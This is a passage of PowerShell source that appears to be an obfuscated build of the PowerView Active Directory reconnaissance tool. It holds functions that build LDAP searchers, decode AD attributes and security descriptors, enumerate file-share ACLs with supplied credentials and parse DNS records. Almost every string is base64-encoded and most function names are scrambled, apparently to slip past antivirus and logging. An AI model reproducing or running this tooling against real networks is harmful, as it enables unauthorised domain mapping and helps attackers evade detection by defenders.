        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${85} = f77 -Credential $Credential
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        f71 @110 | ? {$_.samaccountname -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awByAGIAdABnAHQA')))} | f119 -OutputFormat $OutputFormat
    }
    END {
        if (${85}) {
            f75 -f2 ${85}
        }
    }
}
function Get-PathAcl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function f118 {
            [CmdletBinding()]
            Param(
                [Int]
                ${f38}
            )
            ${517} = @{
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADgAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBSAGUAYQBkAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADQAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBXAHIAaQB0AGUA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADIAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBFAHgAZQBjAHUAdABlAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBBAGwAbABvAHcAZQBkAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMQAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAUwB5AHMAdABlAG0AUwBlAGMAdQByAGkAdAB5AA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAxADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AG4AYwBoAHIAbwBuAGkAegBlAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADgAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE8AdwBuAGUAcgA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADQAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEQAQQBDAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADIAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABDAG8AbgB0AHIAbwBsAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADEAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAxADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEEAdAB0AHIAaQBiAHUAdABlAHMA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADgAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAHQAdAByAGkAYgB1AHQAZQBzAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADQAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUAQwBoAGkAbABkAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADIAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAZQAvAFQAcgBhAHYAZQByAHMAZQA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADEAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEUAeAB0AGUAbgBkAGUAZABBAHQAdAByAGkAYgB1AHQAZQBzAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAOAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABFAHgAdABlAG4AZABlAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAANAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAHAAZQBuAGQARABhAHQAYQAvAEEAZABkAFMAdQBiAGQAaQByAGUAYwB0AG8AcgB5AA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMgA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEQAYQB0AGEALwBBAGQAZABGAGkAbABlAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMQA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABEAGEAdABhAC8ATABpAHMAdABEAGkAcgBlAGMAdABvAHIAeQA=')))
            }
            ${518} = @{
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAZgAwADEAZgBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgB1AGwAbABDAG8AbgB0AHIAbwBsAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMwAwADEAYgBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAGQAaQBmAHkA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAYQA5AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAG4AZABFAHgAZQBjAHUAdABlAA==')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADEAOQBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAG4AZABXAHIAaQB0AGUA')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAOAA5AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZAA=')))
                [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADEAMQA2AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAA==')))
            }
            ${516} = @()
            ${516} += ${518}.Keys | % {
                              if ((${f38} -band $_) -eq $_) {
                                ${518}[$_]
                                ${f38} = ${f38} -band (-not $_)
                              }
                            }
            ${516} += ${517}.Keys | ? { ${f38} -band $_ } | % { ${517}[$_] }
            (${516} | ? {$_}) -join ','
        }
        ${217} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${217}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${150} = @{}
    }
    PROCESS {
        ForEach (${154} in $Path) {
            try {
                if ((${154} -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                    ${155} = (New-Object System.Uri(${154})).Host
                    if (-not ${150}[${155}]) {
                        f93 -94 ${155} -Credential $Credential
                        ${150}[${155}] = $True
                    }
                }
                ${27} = Get-Acl -Path ${154}
                ${27}.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | % {
                    ${515} = $_.IdentityReference.Value
                    $Name = f94 -438 ${515} @217
                    ${179} = New-Object PSObject
                    ${179} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))) ${154}
                    ${179} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBTAHkAcwB0AGUAbQBSAGkAZwBoAHQAcwA='))) (f118 -f38 $_.FileSystemRights.value__)
                    ${179} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAA=='))) $Name
                    ${179} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFMASQBEAA=='))) ${515}
                    ${179} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAQwBvAG4AdAByAG8AbABUAHkAcABlAA=='))) $_.AccessControlType
                    ${179}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAGkAbABlAEEAQwBMAA=='))))
                    ${179}
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAYQB0AGgAQQBjAGwAXQAgAGUAcgByAG8AcgA6ACAAJABfAA==')))
            }
        }
    }
    END {
        ${150}.Keys | f91
    }
}
function f104 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )
    ${473} = @{}
    $Properties.PropertyNames | % {
        if ($_ -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHMAcABhAHQAaAA=')))) {
            if (($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBpAGQAaABpAHMAdABvAHIAeQA='))))) {
                ${473}[$_] = $Properties[$_] | % { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAHQAeQBwAGUA')))) {
                ${473}[$_] = $Properties[$_][0] -as ${24}
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA==')))) {
                ${473}[$_] = $Properties[$_][0] -as ${25}
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA=')))) {
                ${473}[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgBhAGMAYwBvAHUAbgB0AGMAbwBuAHQAcgBvAGwA')))) {
                ${473}[$_] = $Properties[$_][0] -as ${23}
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB0AHMAZQBjAHUAcgBpAHQAeQBkAGUAcwBjAHIAaQBwAHQAbwByAA==')))) {
                ${514} = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                if (${514}.Owner) {
                    ${473}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAA==')))] = ${514}.Owner
                }
                if (${514}.Group) {
                    ${473}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA==')))] = ${514}.Group
                }
                if (${514}.DiscretionaryAcl) {
                    ${473}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYwByAGUAdABpAG8AbgBhAHIAeQBBAGMAbAA=')))] = ${514}.DiscretionaryAcl
                }
                if (${514}.SystemAcl) {
                    ${473}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0AQQBjAGwA')))] = ${514}.SystemAcl
                }
            }
            elseif ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBjAGMAbwB1AG4AdABlAHgAcABpAHIAZQBzAA==')))) {
                if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    ${473}[$_] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFYARQBSAA==')))
                }
                else {
                    ${473}[$_] = [datetime]::fromfiletime($Properties[$_][0])
                }
            }
            elseif ( ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4A')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAbABhAHMAdABzAGUAdAA=')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAGYAZgA=')))) -or ($_ -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAUABhAHMAcwB3AG8AcgBkAFQAaQBtAGUA')))) ) {
                if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                    ${380} = $Properties[$_][0]
                    [Int32]${513} = ${380}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [System.Reflection.BindingFlags]::GetProperty, $Null, ${380}, $Null)
                    [Int32]${512}  = ${380}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))),  [System.Reflection.BindingFlags]::GetProperty, $Null, ${380}, $Null)
                    ${473}[$_] = ([datetime]::FromFileTime([Int64]($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAA6AHgAOAB9AHsAMQA6AHgAOAB9AA=='))) -f ${513}, ${512})))
                }
                else {
                    ${473}[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
                }
            }
            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                ${511} = $Properties[$_]
                try {
                    ${380} = ${511}[$_][0]
                    [Int32]${513} = ${380}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [System.Reflection.BindingFlags]::GetProperty, $Null, ${380}, $Null)
                    [Int32]${512}  = ${380}.GetType().InvokeMember($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))),  [System.Reflection.BindingFlags]::GetProperty, $Null, ${380}, $Null)
                    ${473}[$_] = [Int64]($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAA6AHgAOAB9AHsAMQA6AHgAOAB9AA=='))) -f ${513}, ${512})
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AC0ATABEAEEAUABQAHIAbwBwAGUAcgB0AHkAXQAgAGUAcgByAG8AcgA6ACAAJABfAA==')))
                    ${473}[$_] = ${511}[$_]
                }
            }
            elseif ($Properties[$_].count -eq 1) {
                ${473}[$_] = $Properties[$_][0]
            }
            else {
                ${473}[$_] = $Properties[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property ${473}
    }
    catch {
        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AC0ATABEAEEAUABQAHIAbwBwAGUAcgB0AHkAXQAgAEUAcgByAG8AcgAgAHAAYQByAHMAaQBuAGcAIABMAEQAQQBQACAAcAByAG8AcABlAHIAdABpAGUAcwAgADoAIAAkAF8A')))
    }
}
function f74 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [String]
        ${f37},
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            $TargetDomain = $Domain
            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                $UserDomain = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $UserDomain) {
                    ${510} = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                }
            }
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${509} = f69 -Credential $Credential
            ${510} = (${509}.PdcRoleOwner).Name
            $TargetDomain = ${509}.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
            $TargetDomain = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $TargetDomain) {
                ${510} = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
        }
        else {
            write-verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBlAHQALQBkAG8AbQBhAGkAbgA=')))
            ${509} = f69
            ${510} = (${509}.PdcRoleOwner).Name
            $TargetDomain = ${509}.Name
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) {
            ${510} = $Server
        }
        ${508} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwA=')))
        if (${510} -and (${510}.Trim() -ne '')) {
            ${508} += ${510}
            if ($TargetDomain) {
                ${508} += '/'
            }
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQBQAHIAZQBmAGkAeAA=')))]) {
            ${508} += ${f37} + ','
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) {
            if ($SearchBase -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBHAEMAOgAvAC8A')))) {
                ${225} = $SearchBase.ToUpper().Trim('/')
                ${508} = ''
            }
            else {
                if ($SearchBase -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBMAEQAQQBQADoALwAvAA==')))) {
                    if ($SearchBase -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAuACsALwAuACsA')))) {
                        ${508} = ''
                        ${225} = $SearchBase
                    }
                    else {
                        ${225} = $SearchBase.SubString(7)
                    }
                }
                else {
                    ${225} = $SearchBase
                }
            }
        }
        else {
            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
                ${225} = "DC=$($TargetDomain.Replace('.', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABEAEMAPQA=')))))"
            }
        }
        ${508} += ${225}
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAZQBhAHIAYwBoAGUAcgBdACAAcwBlAGEAcgBjAGgAIABiAGEAcwBlADoAIAAkAHsANQAwADgAfQA=')))
        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAZQBhAHIAYwBoAGUAcgBdACAAVQBzAGkAbgBnACAAYQBsAHQAZQByAG4AYQB0AGUAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIABmAG8AcgAgAEwARABBAFAAIABjAG8AbgBuAGUAYwB0AGkAbwBuAA==')))
            ${509} = New-Object DirectoryServices.DirectoryEntry(${508}, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            ${31} = New-Object System.DirectoryServices.DirectorySearcher(${509})
        }
        else {
            ${31} = New-Object System.DirectoryServices.DirectorySearcher([ADSI]${508})
        }
        ${31}.PageSize = $ResultPageSize
        ${31}.SearchScope = $SearchScope
        ${31}.CacheResults = $False
        ${31}.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) {
            ${31}.ServerTimeLimit = $ServerTimeLimit
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) {
            ${31}.Tombstone = $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
            ${31}.filter = $LDAPFilter
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) {
            ${31}.SecurityMasks = Switch ($SecurityMasks) {
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGMAbAA='))) { [System.DirectoryServices.SecurityMasks]::Dacl }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA=='))) { [System.DirectoryServices.SecurityMasks]::Group }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA='))) { [System.DirectoryServices.SecurityMasks]::None }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAA=='))) { [System.DirectoryServices.SecurityMasks]::Owner }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAGMAbAA='))) { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
            ${507} = $Properties| % { $_.Split(',') }
            $Null = ${31}.PropertiesToLoad.AddRange((${507}))
        }
        ${31}
    }
}
function f116 {
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $DNSRecord
    )
    BEGIN {
        function f117 {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )
            [Int]${506} = $Raw[0]
            [Int]${505} = $Raw[1]
            [Int]${53} =  2
            [String]$Name  = ''
            while (${505}-- -gt 0)
            {
                [Int]${499} = $Raw[${53}++]
                while (${499}-- -gt 0) {
                    $Name += [Char]$Raw[${53}++]
                }
                $Name += "."
            }
            $Name
        }
    }
    PROCESS {
        ${497} = [BitConverter]::ToUInt16($DNSRecord, 2)
        ${496} = [BitConverter]::ToUInt32($DNSRecord, 8)
        ${504} = $DNSRecord[12..15]
        $Null = [array]::Reverse(${504})
        ${495} = [BitConverter]::ToUInt32(${504}, 0)
        ${494} = [BitConverter]::ToUInt32($DNSRecord, 20)
        if (${494} -ne 0) {
            ${493} = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours(${494})).ToString()
        }
        else {
            ${493} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBzAHQAYQB0AGkAYwBdAA==')))
        }
        ${491} = New-Object PSObject
        if (${497} -eq 1) {
            ${503} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwAH0ALgB7ADEAfQAuAHsAMgB9AC4AewAzAH0A'))) -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
            ${492} = ${503}
            ${491} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAbwByAGQAVAB5AHAAZQA='))) 'A'
        }
        elseif (${497} -eq 2) {
            ${502} = f117 $DNSRecord[24..$DNSRecord.length]
            ${492} = ${502}
